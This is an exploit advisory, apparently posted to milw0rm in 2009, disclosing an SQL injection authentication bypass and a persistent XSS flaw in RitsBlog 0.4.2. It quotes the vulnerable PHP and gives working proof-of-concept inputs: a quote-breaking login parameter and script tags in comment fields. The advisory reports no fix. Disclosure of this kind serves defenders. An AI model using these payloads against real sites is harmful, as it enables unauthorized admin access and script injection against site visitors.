<html><head><title>RitsBlog 0.4.2 (AB/XSS) Multiple Remote Vulnerabilities</title></head><pre>*******   Salvatore &quot;drosophila&quot; Fresta   *******

[+] Application: RitsBlog
[+] Version: 0.4.2
[+] Website: http://sourceforge.net/projects/ritsblog/

[+] Bugs: [A] SQL Injection
          [B] XSS Persistent

[+] Exploitation: Remote
[+] Date: 02 Mar 2009

[+] Discovered by: Salvatore &quot;drosophila&quot; Fresta
[+] Author: Salvatore &quot;drosophila&quot; Fresta
[+] Contact: e-mail: drosophilaxxx@gmail.com


*************************************************

[+] Menu

- [1] Bugs
- [2] Code
- [3] Fix


*************************************************

[+] Bugs

- [A] SQL Injection

[-] Requisites: magic_quotes_gpc = off
[-] File affected: ritsBlogAdmin.class.php

This blog is entirely vulnerable to SQL Injection.
The following is the vulnerable query that can be
used to bypass authentication.

In jobs.php:

if ($_GET[j] == &quot;login&quot;){
     if ($blog -&gt; login($_GET[p])){
         $_SESSION[loggedin] = &quot;ok&quot;;
         $_SESSION[userID] = $blog -&gt; userID;
         echo &quot;Password found. Loging in...&quot;;
         ....

In ritsBlogAdmin.class.php:

function login($password){
         global $db;
         $sql = &quot;select * from users where secretWord  = '$password'&quot;;
         ...
}


- [B] XSS Persistent

[-] Requisites: none
[-] File affected: ritsBlogAdmin.class.php

In jobs.php:

if ($_POST[j] == &quot;addComment&quot;){
         echo $blog -&gt; addComment($_POST[id], $_POST[name],
$_POST[body]);
}

In ritsBlogAdmin.class.php

function addComment($id, $name, $body){
         global $db;
         $sql = &quot;INSERT INTO comments (name, postID, date, text)
VALUES('&quot; . addslashes($name) . &quot;','&quot; . $id . &quot;',NOW(),'&quot; .
addslashes($body) . &quot;')&quot;;
         ...
}


*************************************************

[+] Code

- [A] SQL Injection

http://www.site.com/path/blogAdmin/jobs.php?j=login&amp;p=1'or'1'='1


- [B] XSS Persistent

It is possible using forms in the index.php or
to send over POST method the following values:

?j=addComment&amp;id=54&amp;name=myname&amp;body=&lt;script&gt;alert('XSS');&lt;/script&gt;

or

?j=addComment&amp;id=54&amp;name=&lt;script&gt;alert('XSS');&lt;/script&gt;&amp;body=body


*************************************************

[+] Fix

No fix.


*************************************************

-- Salvatore &quot;drosophila&quot; Fresta CWNP444351 

# milw0rm.com [2009-03-02]</pre></html>